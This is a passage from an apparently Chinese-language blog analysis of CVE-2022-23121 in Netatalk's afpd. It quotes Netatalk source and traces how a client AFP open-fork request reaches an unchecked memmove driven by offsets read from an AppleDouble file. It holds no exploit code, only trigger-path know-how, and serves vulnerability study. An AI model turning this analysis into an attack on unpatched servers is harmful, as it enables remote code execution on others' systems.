&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> path &lt;span style="color:#f92672">?&lt;/span> fullpathname(path) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后&lt;code>ad_header_read_osx&lt;/code> 会读取adouble结构体内的偏移，判断finderinfo的entry len是否等于32，不等于则进入if内，并调用&lt;code>libatalk/adouble/ad_open.c#ad_convert_osx&lt;/code> 函数&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/3.png" />&lt;/p>
&lt;p>在&lt;code>ad_convert_osx&lt;/code> 函数中会读取ad指针指向的adouble结构体内的entry结构的off和len偏移并调用&lt;code>memmove&lt;/code>函数进行内存复制，此偏移恰好是&lt;code>parse_entries&lt;/code> 函数从文件读取并赋值的偏移。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">ad_convert_osx&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>path, &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">adouble&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ad)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> origlen &lt;span style="color:#f92672">=&lt;/span> ad_getentryoff(ad, ADEID_RFORK) &lt;span style="color:#f92672">+&lt;/span> ad_getentrylen(ad, ADEID_RFORK);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> map &lt;span style="color:#f92672">=&lt;/span> mmap(NULL, origlen, PROT_READ &lt;span style="color:#f92672">|&lt;/span> PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad), &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (map &lt;span style="color:#f92672">==&lt;/span> MAP_FAILED) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LOG(log_error, logtype_ad, &lt;span style="color:#e6db74">&amp;#34;mmap AppleDouble: %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, strerror(errno));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> EC_FAIL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memmove(map &lt;span style="color:#f92672">+&lt;/span> ad_getentryoff(ad, ADEID_FINDERI) &lt;span style="color:#f92672">+&lt;/span> ADEDLEN_FINDERI,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> map &lt;span style="color:#f92672">+&lt;/span> ad_getentryoff(ad, ADEID_RFORK),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ad_getentrylen(ad, ADEID_RFORK));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">void&lt;/span>)ad_rebuild_adouble_header_osx(ad, map);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> munmap(map, origlen);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="分析函数调用链">&lt;strong>分析函数调用链&lt;/strong>&lt;/h3>
&lt;p>通过
&lt;a href="https://www.cnblogs.com/realjimmy/p/12892179.html" target="_blank">doxygen+graphviz绘制函数调用链图&lt;/a>，从图中可以看出完整的函数调用链为：&lt;code>ad_open→ad_open_rf→ad_open_rf_ea→ad_header_read_osx→parse_entries&lt;/code>&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/4.png" />&lt;/p>
&lt;p>而&lt;code>ad_open&lt;/code>函数所在的libatalk目录内的代码会被编译为&lt;code>libatalk.so&lt;/code>，最终被&lt;code>afpd&lt;/code>服务使用，在&lt;code>afpd&lt;/code> 代码中，由&lt;code>etc/afpd/fork.c#afp_openfork&lt;/code> 调用&lt;code>libatalk/adouble/ad_open.c#ad_open&lt;/code>函数。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/5.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">afp_openfork&lt;/span>(AFPObj &lt;span style="color:#f92672">*&lt;/span>obj _U_, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ibuf, size_t ibuflen _U_, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rbuf, size_t &lt;span style="color:#f92672">*&lt;/span>rbuflen)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* First ad_open(), opens data or ressource fork */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (ad_open(ofork&lt;span style="color:#f92672">-&amp;gt;&lt;/span>of_ad, upath, adflags, &lt;span style="color:#ae81ff">0666&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>libatalk/adouble/ad_open.c#ad_open&lt;/code> 函数中，当请求内设置了&lt;code>ADFLAGS_RF&lt;/code>这个flag才会调用&lt;code>ad_open_rf&lt;/code>函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (adflags &lt;span style="color:#f92672">&amp;amp;&lt;/span> ADFLAGS_RF) { &lt;span style="color:#75715e">// ADFLAGS_RF = 1&amp;lt;&amp;lt;1 = 2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (ad_open_rf(path, adflags, mode, ad) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> EC_FAIL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="触发漏洞流程">&lt;strong>触发漏洞流程&lt;/strong>&lt;/h3>
&lt;p>想要触发该漏洞，必须要了解到afpd服务如何处理客户端请求，以便构造请求执行到漏洞代码处。&lt;/p>
&lt;p>启动Netatalk的服务端afpd服务后，在afpd的&lt;code>main&lt;/code>函数入口处初始化一些变量、加载AFP配置、监听端口等。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> ac, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>av)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sigaction&lt;/span> sv;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sigset_t sigs;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> ret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (afp_config_parse(&lt;span style="color:#f92672">&amp;amp;&lt;/span>obj, &lt;span style="color:#e6db74">&amp;#34;afpd&amp;#34;&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> obj.options.save_mask &lt;span style="color:#f92672">=&lt;/span> umask(obj.options.umask);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> asev&lt;span style="color:#f92672">-&amp;gt;&lt;/span>used; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (asev&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fdset[i].revents &lt;span style="color:#f92672">&amp;amp;&lt;/span> (POLLIN &lt;span style="color:#f92672">|&lt;/span> POLLERR &lt;span style="color:#f92672">|&lt;/span> POLLHUP &lt;span style="color:#f92672">|&lt;/span> POLLNVAL)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (asev&lt;span style="color:#f92672">-&amp;gt;&lt;/span>data[i].fdtype) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> LISTEN_FD:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((child &lt;span style="color:#f92672">=&lt;/span> dsi_start(&lt;span style="color:#f92672">&amp;amp;&lt;/span>obj, (DSI &lt;span style="color:#f92672">*&lt;/span>)(asev&lt;span style="color:#f92672">-&amp;gt;&lt;/span>data[i].&lt;span style="color:#66d9ef">private&lt;/span>), server_children))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>(asev_add_fd(asev, child&lt;span style="color:#f92672">-&amp;gt;&lt;/span>afpch_ipc_fd, IPC_FD, child))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kill(child&lt;span style="color:#f92672">-&amp;gt;&lt;/span>afpch_pid, SIGKILL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后进入&lt;code>while&lt;/code>循环，调用 &lt;code>etc/afpd/main.c#dsi_start&lt;/code>，&lt;code>dsi_start&lt;/code> 调用&lt;code>dsi_getsession&lt;/code> ，在&lt;code>dsi_getsession&lt;/code>中调用&lt;code>dsi-&amp;gt;proto_open&lt;/code> 函数指针，实际指向&lt;code>libatalk/dsi/dsi_tcp.c#dsi_tcp_open&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> afp_child_t &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">dsi_start&lt;/span>(AFPObj &lt;span style="color:#f92672">*&lt;/span>obj, DSI &lt;span style="color:#f92672">*&lt;/span>dsi, server_child_t &lt;span style="color:#f92672">*&lt;/span>server_children)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_child_t &lt;span style="color:#f92672">*&lt;/span>child &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (dsi_getsession(dsi, server_children, obj&lt;span style="color:#f92672">-&amp;gt;&lt;/span>options.tickleval, &lt;span style="color:#f92672">&amp;amp;&lt;/span>child) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* we&amp;#39;ve forked. */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (child &lt;span style="color:#f92672">==&lt;/span> NULL) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> configfree(obj, dsi);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> afp_over_dsi(obj); &lt;span style="color:#75715e">/* start a session */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit (&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> child;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">dsi_getsession&lt;/span>(DSI &lt;span style="color:#f92672">*&lt;/span>dsi, server_child_t &lt;span style="color:#f92672">*&lt;/span>serv_children, &lt;span style="color:#66d9ef">int&lt;/span> tickleval, afp_child_t &lt;span style="color:#f92672">**&lt;/span>childp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置、初始化变量等操作，通过fork函数创建子进程
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">switch&lt;/span> (pid &lt;span style="color:#f92672">=&lt;/span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>proto_open(dsi)) { &lt;span style="color:#75715e">/* in libatalk/dsi/dsi_tcp.c */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>dsi_tcp_open&lt;/code>函数接收来自客户端的连接，通过fork函数创建子进程&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> pid_t &lt;span style="color:#a6e22e">dsi_tcp_open&lt;/span>(DSI &lt;span style="color:#f92672">*&lt;/span>dsi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pid_t pid;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SOCKLEN_T len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>(dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>client);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>socket &lt;span style="color:#f92672">=&lt;/span> accept(dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>serversock, (&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sockaddr&lt;/span> &lt;span style="color:#f92672">*&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span>dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>client, &lt;span style="color:#f92672">&amp;amp;&lt;/span>len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">==&lt;/span> (pid &lt;span style="color:#f92672">=&lt;/span> fork()) ) { &lt;span style="color:#75715e">/* child */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* send back our pid */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> pid;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>返回到&lt;code>dsi_getsession&lt;/code>函数中，当fork返回的pid为0时，即当前进程为子进程则跳出&lt;code>switch&lt;/code>结构，进入处理DSI数据的逻辑，当返回的pid不为0也不为-1时，即当前进程为父进程，则返回到&lt;code>dsi_start&lt;/code>函数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">dsi_getsession&lt;/span>(DSI &lt;span style="color:#f92672">*&lt;/span>dsi, server_child_t &lt;span style="color:#f92672">*&lt;/span>serv_children, &lt;span style="color:#66d9ef">int&lt;/span> tickleval, afp_child_t &lt;span style="color:#f92672">**&lt;/span>childp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置、初始化变量等操作
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">switch&lt;/span> (pid &lt;span style="color:#f92672">=&lt;/span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>proto_open(dsi)) { &lt;span style="color:#75715e">/* in libatalk/dsi/dsi_tcp.c */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75715e">// 如果是子进程则直接退出switch，进入处理DSI数据的逻辑
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75715e">//如果是父进程则返回到dsi_start函数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>proto_close(dsi);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>childp &lt;span style="color:#f92672">=&lt;/span> child;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>header.dsi_command) { &lt;span style="color:#75715e">// 根据dsi命令执行不同动作
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">case&lt;/span> DSIFUNC_STAT: &lt;span style="color:#75715e">/* send off status and return */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DSIFUNC_OPEN: &lt;span style="color:#75715e">/* setup session */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* set up the tickle timer */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>timer.it_interval.tv_sec &lt;span style="color:#f92672">=&lt;/span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>timer.it_value.tv_sec &lt;span style="color:#f92672">=&lt;/span> tickleval;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>timer.it_interval.tv_usec &lt;span style="color:#f92672">=&lt;/span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>timer.it_value.tv_usec &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dsi_opensession(dsi);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>childp &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75715e">/* just close */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LOG(log_info, logtype_dsi, &lt;span style="color:#e6db74">&amp;#34;DSIUnknown %d&amp;#34;&lt;/span>, dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>header.dsi_command);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>proto_close(dsi);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(EXITERR_CLNT);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后回到&lt;code>dsi_start&lt;/code>函数中，如果当前进程为父进程则返回到&lt;code>main&lt;/code>函数中的&lt;code>while&lt;/code>循环中，等待客户端的连接。如果当前进程为子进程则调用&lt;code>afp_over_dsi&lt;/code>函数处理AFP数据，根据不同的AFP命令调用全局变量&lt;code>afp_switch[]&lt;/code>内的不同函数指针进行处理&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">afp_over_dsi&lt;/span>(AFPObj &lt;span style="color:#f92672">*&lt;/span>obj)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* get stuck here until the end */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cmd &lt;span style="color:#f92672">=&lt;/span> dsi_stream_receive(dsi);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span>(cmd) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DSIFUNC_CLOSE:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DSIFUNC_TICKLE:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> DSIFUNC_CMD:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> function &lt;span style="color:#f92672">=&lt;/span> (u_char) dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>commands[&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* send off an afp command. in a couple cases, we take advantage
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * of the fact that we&amp;#39;re a stream-based protocol. */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (afp_switch[function]) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>datalen &lt;span style="color:#f92672">=&lt;/span> DSI_DATASIZ;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dsi&lt;span style="color:#f92672">-&amp;gt;&lt;/span>flags &lt;span style="color:#f92672">|=&lt;/span> DSI_RUNNING;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LOG(log_debug, logtype_afpd, &lt;span style="color:#e6db74">&amp;#34;&amp;lt;== Start AFP command: %s&amp;#34;&lt;/span>, AfpNum2name(function));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
